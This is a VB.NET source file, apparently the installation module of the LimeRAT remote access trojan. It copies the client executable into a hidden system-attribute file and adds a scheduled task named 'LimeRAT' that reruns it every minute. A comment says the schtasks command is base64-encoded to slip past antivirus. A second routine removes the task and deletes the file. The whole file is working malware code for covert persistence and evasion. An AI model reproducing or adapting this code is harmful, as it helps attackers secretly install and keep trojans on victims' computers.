Namespace Lime

    Public Class C_Installation

        Public Shared Sub INS()

            'Install client on PC
            'Using schtasks instead of reg and startup folder

            If C_Settings.DROP Then
                If Windows.Forms.Application.ExecutablePath <> C_Settings.fullpath Then 'Checking if client is already installed

                    'client not installed// begin installing
                    Try
                        If Not IO.Directory.Exists(Environ(C_Settings.PATH1) & "\" & C_Settings.PATH2) Then 'Checking and creating FOLDER PATH1 PATH2
                            IO.Directory.CreateDirectory(Environ(C_Settings.PATH1) & "\" & C_Settings.PATH2)
                        ElseIf IO.File.Exists(C_Settings.fullpath) Then 'If somehow filename exists , I will delete it and replace it with client
                            IO.File.Delete(C_Settings.fullpath)
                        End If

                        Dim NF As New IO.FileStream(C_Settings.fullpath, IO.FileMode.CreateNew) 'Installing client using FS instead of io.file.copy
                        Dim LEXEBYTES As Byte() = IO.File.ReadAllBytes(Windows.Forms.Application.ExecutablePath)
                        NF.Write(LEXEBYTES, 0, LEXEBYTES.Length)
                        NF.Flush()
                        NF.Close()

                        IO.File.SetAttributes(C_Settings.fullpath, IO.FileAttributes.System + IO.FileAttributes.Hidden) 'Hide client

                        '"schtasks /create /f /sc minute /mo 1 /tn LimeRAT /tr "
                        'string "schtasks" will triggers AV, conv to base64 to play around av
                        Shell(BS(Convert.FromBase64String("c2NodGFza3MgL2NyZWF0ZSAvZiAvc2MgbWludXRlIC9tbyAxIC90biBMaW1lUkFUIC90ciA=")) & C_Settings.fullpath & "", AppWinStyle.Hide, False, -1) 'persistence

                        Diagnostics.Process.Start(C_Settings.fullpath) 'Start client from fullpath location
                        End ' Close this application because fullpath will be started
                    Catch ex As Exception
                    End Try
                End If

            Else
                C_Settings.fullpath = Windows.Forms.Application.ExecutablePath 'drop false
            End If


        End Sub

        Public Shared Sub DEL()
            'Uninstall client from PC

            Try
                If C_Settings.DROP Then
                    IO.File.SetAttributes(C_Settings.fullpath, IO.FileAttributes.Normal) 'un-hide
                    Threading.Thread.Sleep(50)

                    'schtasks /Delete /tn LimeRAT /F
                    Shell(BS(Convert.FromBase64String("c2NodGFza3MgL0RlbGV0ZSAvdG4gTGltZVJBVCAvRg==")), AppWinStyle.Hide, False, -1) 'delete persistence
                    Threading.Thread.Sleep(50)
                End If
                Shell("cmd.exe /c ping 0 -n 2 & del """ & C_Settings.fullpath & """", AppWinStyle.Hide, False, -1) 'Delete NEXE
                End
            Catch ex As Exception
            End Try
        End Sub

    End Class

End Namespace
